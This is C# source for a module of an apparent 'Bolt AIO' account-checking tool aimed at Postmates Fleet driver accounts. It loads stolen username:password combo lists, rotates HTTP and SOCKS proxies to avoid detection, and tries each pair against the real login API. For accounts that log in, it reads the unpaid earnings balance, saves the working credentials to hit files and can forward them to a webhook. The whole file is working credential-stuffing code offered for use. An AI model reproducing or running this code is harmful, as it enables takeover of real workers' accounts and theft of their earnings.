using System;
using System.Collections.Generic;
using System.Linq;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Threading;
using BoltCUI;
using Leaf.xNet;

namespace Bolt_AIO
{
    internal class Postmatesfleet
    {
        public static List<string> Combos = Program.Combos;
        public static int Combosindex;

        public static void Check()
        {
            for (;;)
            {
                if (Program.Proxyindex > Program.Proxies.Count() - 2) Program.Proxyindex = 0;
                try
                {
                    Interlocked.Increment(ref Program.Proxyindex);
                    using (var req = new HttpRequest())
                    {
                        if (Combosindex >= Combos.Count())
                        {
                            Program.Stop++;
                            break;
                        }

                        Interlocked.Increment(ref Combosindex);
                        var array = Combos[Combosindex].Split(':', ';', '|');
                        var text = array[0] + ":" + array[1];
                        try
                        {
                            switch (Program.ProxyType1)
                            {
                                case "HTTP":
                                    req.Proxy = HttpProxyClient.Parse(Program.Proxies[Program.Proxyindex]);
                                    req.Proxy.ConnectTimeout = 5000;
                                    break;
                                case "SOCKS4":
                                    req.Proxy = Socks4ProxyClient.Parse(Program.Proxies[Program.Proxyindex]);
                                    req.Proxy.ConnectTimeout = 5000;
                                    break;
                                case "SOCKS5":
                                    req.Proxy = Socks5ProxyClient.Parse(Program.Proxies[Program.Proxyindex]);
                                    req.Proxy.ConnectTimeout = 5000;
                                    break;
                            }

                            req.UserAgent =
                                "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36";
                            req.IgnoreProtocolErrors = true;
                            req.AllowAutoRedirect = true;
                            req.AddHeader("Pragma", "no-cache");
                            req.AddHeader("Accept", "application/json, text/plain, */*");
                            req.AddHeader("Host", "fleet.postmates.com");
                            req.AddHeader("Connection", "keep-alive");
                            req.AddHeader("X-Requested-With", "XMLHttpRequest");
                            req.AddHeader("Accept-Language", "en-US");
                            req.AddHeader("Referer", "https://fleet.postmates.com/login");
                            req.AddHeader("Accept-Encoding", "gzip, deflate, br");
                            var str = "{\"username\":\"" + array[0] + "\",\"password\":\"" + array[1] + "\"}";
                            req.SslCertificateValidatorCallback =
                                (RemoteCertificateValidationCallback) Delegate.Combine(
                                    req.SslCertificateValidatorCallback,
                                    new RemoteCertificateValidationCallback((obj, cert, ssl, error) =>
                                        (cert as X509Certificate2).Verify()));
                            var strResponse = req.Post("https://fleet.postmates.com/v1/login", str,
                                "application/json;charset=UTF-8").ToString();
                            {
                                if (strResponse.Contains("client is not authenticated for this resource"))
                                {
                                    Program.TotalChecks++;
                                    Program.Fails++;
                                }
                                else if (strResponse.Contains("200"))
                                {
                                    Program.TotalChecks++;
                                    Program.Fails++;
                                }
                                else if (strResponse.Contains("\"auth_channel\":\"sign_in\""))
                                {
                                    req.ClearAllHeaders();
                                    req.UserAgent =
                                        "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36";
                                    req.AddHeader("Pragma", "no-cache");
                                    req.AddHeader("Accept", "application/json, text/plain, */*");
                                    req.AddHeader("Host", "fleet.postmates.com");
                                    req.AddHeader("Connection", "keep-alive");
                                    req.AddHeader("X-Requested-With", "XMLHttpRequest");
                                    req.AddHeader("Accept-Language", "en-US");
                                    req.AddHeader("Referer", "https://fleet.postmates.com/dashboard");
                                    req.AddHeader("Accept-Encoding", "gzip, deflate, br");
                                    var cap = req.Get("https://fleet.postmates.com/v1/earnings_overview").ToString();
                                    var bal = Parse(cap, "unpaid_balance\":", ",\"");
                                    if (bal.Contains("0"))
                                    {
                                        Program.TotalChecks++;
                                        Program.Frees++;
                                        Export.AsResult("/Postmatesfleet_frees",
                                            array[0] + ":" + array[1] + " | Balance: " + bal);
                                        if (Program.lorc == "LOG")
                                            Settings.PrintFree("Postmatesfleet",
                                                array[0] + ":" + array[1] + " | Balance: " + bal);
                                    }
                                    else
                                    {
                                        Program.TotalChecks++;
                                        Program.Hits++;
                                        Export.AsResult("/Postmatesfleet_hits",
                                            array[0] + ":" + array[1] + " | Balance: " + "$" + bal);
                                        if (Program.lorc == "LOG")
                                            Settings.PrintHit("Postmatesfleet",
                                                array[0] + ":" + array[1] + " | Balance: " + "$" + bal);
                                        if (Settings.sendToWebhook)
                                            Settings.sendTowebhook1(
                                                array[0] + ":" + array[1] + " | Balance: " + "$" + bal,
                                                "Postmatesfleet Hits");
                                    }
                                }
                            }
                        }
                        catch (Exception)
                        {
                            Program.Combos.Add(text);
                        }
                    }
                }
                catch
                {
                    Interlocked.Increment(ref Program.Errors);
                }
            }
        }

        private static string Parse(string source, string left, string right)
        {
            return source.Split(new string[1] {left}, StringSplitOptions.None)[1].Split(new string[1]
            {
                right
            }, StringSplitOptions.None)[0];
        }

        public static string Base64Encode(string plainText)
        {
            return Convert.ToBase64String(Encoding.UTF8.GetBytes(plainText));
        }
    }
}